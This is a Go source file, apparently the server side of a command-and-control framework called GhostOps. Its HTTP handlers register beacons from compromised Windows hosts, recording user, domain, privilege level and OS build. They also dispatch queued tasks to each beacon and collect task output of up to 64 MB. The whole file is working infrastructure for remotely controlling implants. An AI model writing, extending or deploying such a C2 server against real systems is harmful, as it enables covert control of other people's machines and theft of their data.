package handlers

import (
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/4w4647/GhostOps/server/store"
)

func shortOS(build uint32) string {
	switch {
	case build >= 26100:
		return "Win11 24H2"
	case build >= 22631:
		return "Win11 23H2"
	case build >= 22621:
		return "Win11 22H2"
	case build >= 22000:
		return "Win11 21H2"
	case build >= 20348:
		return "Server 2022"
	case build >= 19045:
		return "Win10 22H2"
	case build >= 19044:
		return "Win10 21H2"
	case build >= 19043:
		return "Win10 21H1"
	case build >= 19042:
		return "Win10 20H2"
	case build >= 19041:
		return "Win10 2004"
	case build >= 17763:
		return "Win10 1809"
	case build >= 14393:
		return "Win10 1607"
	case build >= 10240:
		return "Win10"
	case build >= 9600:
		return "Win8.1"
	case build >= 7601:
		return "Win7 SP1"
	default:
		return "Windows"
	}
}

type C2 struct {
	Store *store.Store
	Log   *log.Logger
}

func (h *C2) log() *log.Logger {
	if h.Log != nil {
		return h.Log
	}
	return log.Default()
}

func (h *C2) Checkin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20) // 1 MB
	var info store.BeaconInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	info.LastSeen = time.Now()
	h.Store.Upsert(&info)
	integ := "LOW"
	switch {
	case info.IntegrityLevel >= 0x6000:
		integ = "SYSTEM"
	case info.IntegrityLevel >= 0x3000:
		integ = "HIGH"
	case info.IntegrityLevel >= 0x2000:
		integ = "MEDIUM"
	}
	elevated := ""
	if info.IsElevated {
		elevated = " *elevated*"
	}
	h.log().Printf("[C2] check-in  %s (%d)  %s\\%s%s  %s  %s  %s  %s",
		info.Hostname, info.BeaconID,
		info.Domain, info.Username, elevated,
		shortOS(info.OsBuild), info.Arch, integ, info.EIP)
	w.WriteHeader(http.StatusOK)
}

func (h *C2) Tasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 || parts[1] == "" {
		http.Error(w, "missing beacon id", http.StatusBadRequest)
		return
	}
	id64, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil {
		http.Error(w, "invalid id", http.StatusBadRequest)
		return
	}
	tasks := h.Store.PollTasks(uint32(id64))
	if len(tasks) > 0 {
		h.log().Printf("[C2] task-poll  id=%-10d  dispatching %d task(s)", id64, len(tasks))
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

func (h *C2) Result(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 64<<20) // 64 MB
	var result store.TaskResult
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	h.Store.SubmitResult(&result)
	h.log().Printf("[C2] result     id=%-10d  task=%s  bytes=%d  err=%q",
		result.BeaconID, result.TaskID, len(result.Output), result.Error)
	w.WriteHeader(http.StatusOK)
}
